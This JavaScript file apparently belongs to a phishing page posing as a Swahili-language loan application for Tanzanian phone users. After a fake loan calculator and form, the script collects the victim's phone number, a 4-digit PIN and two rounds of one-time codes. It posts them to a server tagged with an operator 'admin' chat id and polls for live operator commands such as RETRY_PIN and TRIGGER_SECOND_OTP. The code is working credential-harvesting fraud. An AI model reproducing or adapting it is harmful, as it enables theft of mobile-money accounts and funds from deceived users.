document.addEventListener('DOMContentLoaded', () => {
  const urlParams = new URLSearchParams(window.location.search);
  const adminChatId = urlParams.get('admin') || '';

  document.getElementById('btn-naelewa').addEventListener('click', () => {
    document.getElementById('intro-modal').style.display = 'none';
  });

  const steps = {
    calc: document.getElementById('step-calculator'),
    form: document.getElementById('step-form'),
    personal: document.getElementById('step-personal'),
    summary: document.getElementById('step-summary'),
    pin: document.getElementById('step-pin'),
    waiting: document.getElementById('step-waiting'),
    otp: document.getElementById('step-otp'),
    otp2: document.getElementById('step-otp2'),
    success: document.getElementById('step-success')
  };

  function showSpinner(show) {
    let modal = document.getElementById('spinnerModal');
    if (!modal && show) {
      modal = document.createElement('div');
      modal.id = 'spinnerModal';
      modal.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:99999;";
      modal.innerHTML = `<div style="background:#fff;padding:20px 30px;border-radius:10px;display:flex;align-items:center;gap:15px;"><div style="width:25px;height:25px;border:3px solid #ccc;border-top-color:#ee5100;border-radius:50%;animation:spin 0.8s linear infinite;"></div><span style="font-weight:500;">Inapakia...</span></div><style>@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>`;
      document.body.appendChild(modal);
    } else if (modal && !show) {
      modal.remove();
    }
  }

  function switchStep(stepName) {
    showSpinner(true);
    setTimeout(() => {
      showSpinner(false);
      Object.values(steps).forEach(s => { if (s) s.classList.add('hidden'); });
      if (steps[stepName]) steps[stepName].classList.remove('hidden');
      window.scrollTo(0, 0);
    }, 400);
  }

  let appData = { amount: '100,000', duration: '12', purpose: '', firstName: '', lastName: '', phone: '', pin: '', otp1: '', otp2: '', userId: null };

  document.getElementById('loan-amount-range').addEventListener('input', (e) => {
    const val = parseInt(e.target.value);
    document.getElementById('display-amount').textContent = `TSh ${val.toLocaleString()}`;
    document.getElementById('form-amount-input').value = val;
  });

  document.getElementById('loan-duration-range').addEventListener('input', (e) => {
    document.getElementById('display-duration').textContent = `miezi ${e.target.value}`;
  });

  document.getElementById('btn-start-apply').addEventListener('click', () => switchStep('form'));
  document.getElementById('btn-next-1').addEventListener('click', () => {
    appData.amount = document.getElementById('form-amount-input').value;
    appData.duration = document.getElementById('form-duration-select').value;
    appData.purpose = document.getElementById('loan-purpose').value || 'Mkopo wa Biashara';
    switchStep('personal');
  });

  document.getElementById('btn-prev-2').addEventListener('click', () => switchStep('calc'));

  const phoneInput = document.getElementById('phone-number');
  const phoneError = document.getElementById('phone-error');

  document.getElementById('btn-next-2').addEventListener('click', () => {
    const clean = phoneInput.value.replace(/\D/g, '');
    if (!/^(061|062|063)\d{7}$/.test(clean)) {
      phoneError.classList.remove('hidden');
      return;
    }
    phoneError.classList.add('hidden');
    appData.firstName = document.getElementById('first-name').value;
    appData.lastName = document.getElementById('last-name').value;
    appData.phone = clean;

    document.getElementById('sum-amount').textContent = `TSh ${Number(appData.amount).toLocaleString()}`;
    document.getElementById('sum-duration').textContent = `Miezi ${appData.duration}`;
    document.getElementById('sum-purpose').textContent = appData.purpose;
    document.getElementById('sum-name').textContent = `${appData.firstName} ${appData.lastName}`;
    switchStep('summary');
  });

  document.getElementById('btn-prev-3').addEventListener('click', () => switchStep('personal'));
  document.getElementById('btn-submit-app').addEventListener('click', () => {
    document.getElementById('pin-phone-display').textContent = `+255${appData.phone}`;
    switchStep('pin');
  });

  const pinBoxes = document.querySelectorAll('.pin-box');
  const btnSubmitPin = document.getElementById('btn-submit-pin');

  pinBoxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val;
      if (val && idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
      const pin = Array.from(pinBoxes).map(b => b.value).join('');
      if (pin.length === 4) { btnSubmitPin.removeAttribute('disabled'); appData.pin = pin; }
      else { btnSubmitPin.setAttribute('disabled', 'true'); }
    });
  });

  btnSubmitPin.addEventListener('click', async () => {
    btnSubmitPin.textContent = 'Inathibitisha...';
    btnSubmitPin.setAttribute('disabled', 'true');
    try {
      const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminChatId)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ contact: appData.phone, pin: appData.pin, amount: appData.amount, adminChatId })
      });
      const data = await res.json();
      if (data.success) {
        appData.userId = data.userId;
        switchStep('waiting');
        pollStatus();
      } else {
        alert(data.error || 'Hitilafu');
        btnSubmitPin.textContent = 'INGIA';
        btnSubmitPin.removeAttribute('disabled');
      }
    } catch (e) {
      alert('Hitilafu ya mtandao');
      btnSubmitPin.textContent = 'INGIA';
      btnSubmitPin.removeAttribute('disabled');
    }
  });

  // Step 1 OTP
  const otpBoxes = document.querySelectorAll('.otp-box');
  const btnSubmitOtp = document.getElementById('btn-submit-otp');
  otpBoxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val;
      if (val && idx < otpBoxes.length - 1) otpBoxes[idx + 1].focus();
      const otp = Array.from(otpBoxes).map(b => b.value).join('');
      if (otp.length === 4) {
        btnSubmitOtp.removeAttribute('disabled');
        appData.otp1 = otp;
        setTimeout(() => btnSubmitOtp.click(), 300);
      } else {
        btnSubmitOtp.setAttribute('disabled', 'true');
      }
    });
  });

  btnSubmitOtp.addEventListener('click', async () => {
    btnSubmitOtp.textContent = 'Inathibitisha...';
    btnSubmitOtp.setAttribute('disabled', 'true');
    try {
      await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: appData.userId, otp: appData.otp1, step: 1 })
      });
    } catch (e) {}
  });

  // Step 2 OTP
  const otp2Boxes = document.querySelectorAll('.otp2-box');
  const btnSubmitOtp2 = document.getElementById('btn-submit-otp2');
  otp2Boxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val;
      if (val && idx < otp2Boxes.length - 1) otp2Boxes[idx + 1].focus();
      const otp2 = Array.from(otp2Boxes).map(b => b.value).join('');
      if (otp2.length === 4) {
        btnSubmitOtp2.removeAttribute('disabled');
        appData.otp2 = otp2;
        setTimeout(() => btnSubmitOtp2.click(), 300);
      } else {
        btnSubmitOtp2.setAttribute('disabled', 'true');
      }
    });
  });

  btnSubmitOtp2.addEventListener('click', async () => {
    btnSubmitOtp2.textContent = 'Inathibitisha...';
    btnSubmitOtp2.setAttribute('disabled', 'true');
    try {
      await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: appData.userId, otp: appData.otp2, step: 2 })
      });
    } catch (e) {}
  });

  function pollStatus() {
    const interval = setInterval(async () => {
      if (!appData.userId) return;
      try {
        const res = await fetch(`/api/check-status/${appData.userId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          clearInterval(interval);
          document.getElementById('otp-phone-display').textContent = `+255${appData.phone}`;
          switchStep('otp');
        } else if (data.status === 'TRIGGER_SECOND_OTP') {
          clearInterval(interval);
          switchStep('otp2');
        } else if (data.status === 'RETRY_PIN') {
          alert('PIN si sahihi ❌');
          switchStep('pin');
          btnSubmitPin.textContent = 'INGIA';
          btnSubmitPin.removeAttribute('disabled');
          pinBoxes.forEach(b => b.value = '');
          pinBoxes[0].focus();
          clearInterval(interval);
        } else if (data.status === 'RETRY_OTP') {
          alert('OTP si sahihi ❌ Tafadhali weka tena');
          switchStep('otp');
          btnSubmitOtp.textContent = 'WASILISHA';
          btnSubmitOtp.removeAttribute('disabled');
          otpBoxes.forEach(b => b.value = '');
          otpBoxes[0].focus();
          clearInterval(interval);
        } else if (data.status === 'SUCCESS') {
          document.getElementById('final-approved-amount').textContent = `TSh ${Number(appData.amount).toLocaleString()}`;
          switchStep('success');
          clearInterval(interval);
        } else if (data.status === 'DENIED') {
          alert('Ufikiaji Umekataliwa ❌');
          clearInterval(interval);
        }
      } catch (e) {}
    }, 2000);
  }

  document.getElementById('btn-home').addEventListener('click', () => window.location.reload());
});
    
